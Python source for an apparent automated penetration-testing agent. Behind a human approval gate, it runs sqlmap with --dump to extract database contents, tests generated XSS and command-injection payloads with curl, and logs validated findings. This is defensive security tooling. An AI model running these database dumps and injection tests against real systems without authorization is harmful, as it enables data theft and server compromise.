"""Exploit validator agent: human approval gate, sqlmap exploit, XSS/CMDi validation."""

import shlex
from urllib.parse import urlparse

from backend.agents.base import BaseAgent
from backend.database import Finding, ScanJob, async_session
from backend.tools.payload_generator import generate_xss_payloads, generate_cmdi_payloads
from backend.ws_manager import ws_manager


class ExploitValidatorAgent(BaseAgent):
    phase = "exploit"

    async def run(self, context: dict = None) -> dict:
        target_url = context.get("target_url", "")
        vuln_results = context.get("vuln_results", {})
        approved = context.get("exploit_approved", False)

        await self._log("thinking", "Starting exploit validation phase")

        results = {"validated_findings": [], "exploit_results": []}

        if not approved:
            # Create an approval-pending scan job
            async with async_session() as session:
                job = ScanJob(
                    target_id=self.target_id,
                    phase=self.phase,
                    tool_name="approval_gate",
                    status="awaiting_approval",
                    command="HUMAN APPROVAL REQUIRED: Exploit validation requires authorization",
                )
                session.add(job)
                await session.commit()
                await session.refresh(job)

            await self._log("decision",
                "HUMAN APPROVAL REQUIRED: The exploit validation phase will attempt to:\n"
                "1. Validate SQL injection with sqlmap --dump (on test DB)\n"
                "2. Test XSS payloads against discovered parameters\n"
                "3. Test command injection payloads\n\n"
                "Waiting for human approval before proceeding..."
            )

            # Broadcast approval request via WebSocket
            await ws_manager.broadcast(self.target_id, {
                "type": "approval_required",
                "target_id": self.target_id,
                "phase": self.phase,
                "message": "Exploit validation requires your approval before running active exploits.",
                "scan_job_id": job.id,
            })

            results["status"] = "awaiting_approval"
            results["approval_job_id"] = job.id
            return results

        # --- APPROVED: Run exploits ---
        await self._log("decision", "Exploit validation APPROVED. Proceeding with active testing.")

        # 1. SQL injection exploitation
        sqlmap_targets = vuln_results.get("sqlmap_targets", [])
        if sqlmap_targets:
            await self._log("decision", "Validating SQL injection with sqlmap --dump")
            for target in sqlmap_targets[:3]:
                url = target.get("url", target_url)
                sqlmap_cmd = (
                    f"sqlmap -u {shlex.quote(url)} --crawl=2 --batch --level=3 --risk=2 "
                    f"--dump --threads=3 --timeout=15 --output-dir=/tmp/sqlmap_exploit "
                    f"--forms 2>/dev/null || true"
                )
                job_id, output, analysis = await self._run_tool("sqlmap_exploit", sqlmap_cmd, timeout=180)

                if "dumped" in output.lower() or "entries" in output.lower():
                    results["validated_findings"].append({
                        "type": "sqli",
                        "url": url,
                        "validated": True,
                        "evidence": output[:3000],
                    })
                    async with async_session() as session:
                        finding = Finding(
                            target_id=self.target_id,
                            scan_job_id=job_id,
                            finding_type="sqli",
                            title="SQL Injection VALIDATED - Database dump successful",
                            description="sqlmap successfully exploited SQL injection and dumped database contents.",
                            severity="critical",
                            cvss_score=9.8,
                            evidence=output[:5000],
                            url=url,
                            is_validated=True,
                            cwe_id="CWE-89",
                            remediation="URGENT: Use parameterized queries. Implement WAF rules. Rotate all database credentials.",
                        )
                        session.add(finding)
                        await session.commit()

        # 2. XSS validation
        await self._log("decision", "Generating and testing XSS payloads")
        xss_payloads = await generate_xss_payloads(self, target_url)
        for payload_info in xss_payloads[:5]:
            payload = payload_info.get("payload", "")
            test_url = payload_info.get("url", target_url)
            param = payload_info.get("parameter", "")

            # Use curl to test XSS
            curl_cmd = (
                f"curl -sk --max-time 10 -o - "
                f"{shlex.quote(test_url)} 2>/dev/null || true"
            )
            job_id, output, analysis = await self._run_tool("xss_test", curl_cmd, timeout=30)

            if payload in output:
                results["validated_findings"].append({
                    "type": "xss",
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "validated": True,
                })
                async with async_session() as session:
                    finding = Finding(
                        target_id=self.target_id,
                        scan_job_id=job_id,
                        finding_type="xss",
                        title=f"Reflected XSS VALIDATED in parameter '{param}'",
                        description=f"XSS payload was reflected in the response without sanitization.",
                        severity="high",
                        cvss_score=6.1,
                        evidence=output[:3000],
                        url=test_url,
                        parameter=param,
                        payload_used=payload,
                        is_validated=True,
                        cwe_id="CWE-79",
                        remediation="Implement output encoding. Use Content-Security-Policy headers.",
                    )
                    session.add(finding)
                    await session.commit()

        # 3. Command injection validation
        await self._log("decision", "Generating and testing command injection payloads")
        cmdi_payloads = await generate_cmdi_payloads(self, target_url)
        for payload_info in cmdi_payloads[:5]:
            payload = payload_info.get("payload", "")
            test_url = payload_info.get("url", target_url)
            param = payload_info.get("parameter", "")
            canary = payload_info.get("canary", "")

            curl_cmd = (
                f"curl -sk --max-time 10 -o - "
                f"{shlex.quote(test_url)} 2>/dev/null || true"
            )
            job_id, output, analysis = await self._run_tool("cmdi_test", curl_cmd, timeout=30)

            if canary and canary in output:
                results["validated_findings"].append({
                    "type": "cmd_injection",
                    "url": test_url,
                    "parameter": param,
                    "payload": payload,
                    "validated": True,
                })
                async with async_session() as session:
                    finding = Finding(
                        target_id=self.target_id,
                        scan_job_id=job_id,
                        finding_type="cmd_injection",
                        title=f"Command Injection VALIDATED in parameter '{param}'",
                        description="OS command injection confirmed. Arbitrary commands can be executed on the server.",
                        severity="critical",
                        cvss_score=9.8,
                        evidence=output[:3000],
                        url=test_url,
                        parameter=param,
                        payload_used=payload,
                        is_validated=True,
                        cwe_id="CWE-78",
                        remediation="Never pass user input to system commands. Use safe APIs instead of shell commands.",
                    )
                    session.add(finding)
                    await session.commit()

        # Summary
        validated_count = len(results["validated_findings"])
        summary_prompt = (
            f"You are a penetration tester. Summarize the exploit validation results:\n\n"
            f"Validated vulnerabilities: {validated_count}\n"
            f"Types: {[f['type'] for f in results['validated_findings']]}\n\n"
            f"Provide a brief executive summary of the validated findings and their impact."
        )
        exploit_summary = await self._ask_llm(summary_prompt)
        results["summary"] = exploit_summary
        await self._log("decision", f"Exploit Validation Summary:\n{exploit_summary}")

        return results
